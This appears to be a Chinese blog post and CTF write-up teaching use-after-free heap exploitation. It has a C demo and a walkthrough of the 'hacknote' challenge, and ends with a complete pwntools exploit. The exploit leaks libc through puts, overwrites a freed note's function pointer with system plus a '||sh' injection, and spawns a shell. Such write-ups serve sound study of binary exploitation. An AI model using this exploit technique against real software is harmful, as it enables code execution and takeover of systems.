---
title: UAF
date: 2022-03-15 14:54:54
tags:
    - uaf
    - 堆
---

<!--more-->

# UAF

​	uaf即use after free，顾名思义，某块内存在释放之后还能被用户使用；一般存在于，free之后没有将指针设为Null，导致野指针的存在。

这里首先放一段简单的c代码，更容易理解（linux 环境）

```
#include <stdio.h>
#include <cstdlib>
#include <string.h>
int main()
{
    char *p1;
    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间
    memcpy(p1,"hello",10);
    printf("p1 addr:%x,%s\n",p1,p1);
    free(p1);//释放内存空间
    char *p2;
    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存
    memcpy(p1,"world",10);//对内存进行修改
    printf("p2 addr:%x,%s\n",p2,p1);//验证
    return 0;
}
```

如上代码所示

> 1.指针p1申请内存，打印其地址值 
>  2.然后释放p1 
>  3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值
>
> Gcc编译，运行结果如下： 
>
> ![image-20220326143522446](https://s2.loli.net/2022/03/26/P9e2m3LtyCiNWjZ.png)

p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给p2，修改p2的值，p1也被修改了。原理差不多这样，接下来直接实战吧。

## 例题练习

## HACKNOTE-UAF

ida打开

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v5; // [esp+Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();		//菜单，1~4分别对应不同功能
      read(0, buf, 4u);
      choice = atoi(buf);
      if ( choice != 2 )
        break;
      del_note();//释放堆块
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        print_note();//打印堆块
      }
      else
      {
        if ( choice == 4 )
          exit(0);//退出
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( choice != 1 )
        goto LABEL_13;
      add_note();//创建堆块
    }
  }
}

```

先看创建堆块add（），有一个print_note_content，里面有一个puts函数

![image-20220315203745446](https://s2.loli.net/2022/03/26/6Ip4ivDVKlEXzWS.png)

然后看delete()模块

![](https://s2.loli.net/2022/03/26/6Ip4ivDVKlEXzWS.png)

根据UAF定义，这里只是free掉了指针指向的内存空间，但是没有将（*notelist+v1）+1和（*notelist+v1）置为Null，如下图的aaaa和bbbb会被free掉，但是指针没有置空存在UAF

![image-20220315204905790](https://s2.loli.net/2022/03/26/Uys8kHlioKBj9WA.png)

## 思路

所以想办法通过UAF指向system函数，在把sh打上去应该就可以

## 做法

先申请两个堆块，例如一个note0，一个note1，然后依次释放，那么我们获得两个还未置空的指针，并且note1—>note0（实际调试看出，下图）

![image-20220326144403109](https://s2.loli.net/2022/03/26/3nJymixOEzTcGsw.png)

当我们再次申请一个堆note2，这时候按照堆分配原则（后进先出），note2 其实会分配 note1 对应的内存块。note2指针指向的 chunk 其实是 note0。如果我们这时候向 note2  的 chunk 部分写入system 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用system函数。但是实际不可能一步到位，我们还是需要先泄露一个函数，然后再在本地libc计算libc偏移获取system的真实地址,刚好add（）函数有一个print_note_content，里面有一个puts函数，所以通过puts函数泄露

## EXP

```
from pwn import *
context.log_level='debug'
p=process('./hacknote')
elf=ELF('./hacknote')
def add_note(size,payload):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.send(payload)
def delete_note(index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
def show_note(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))
#leak libc
add_note(32,'aaaa')#note0
add_note(32,'bbbb')#note1
delete_note(0)
delete_note(1)
payload=p32(0x0804865B)+p32(elf.got['puts'])#泄露puts地址
add_note(8,payload)#note2
show_note(0)#获取note0
puts_got=u32(p.recv(4))
print hex(puts_got)
#get system_addr
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
libcbase=puts_got-libc.sym['puts']
system_addr=libcbase+libc.sym['system']
#get_shell
delete_note(2)
#payload1=p32(system_addr)+p32(libcbase + libc.search('/bin/sh').next())
payload1=p32(system_addr)+'||sh'#这个||sh是shell注入
add_note(8,payload1)
#gdb.attach(p)
show_note(0)
p.interactive()

```

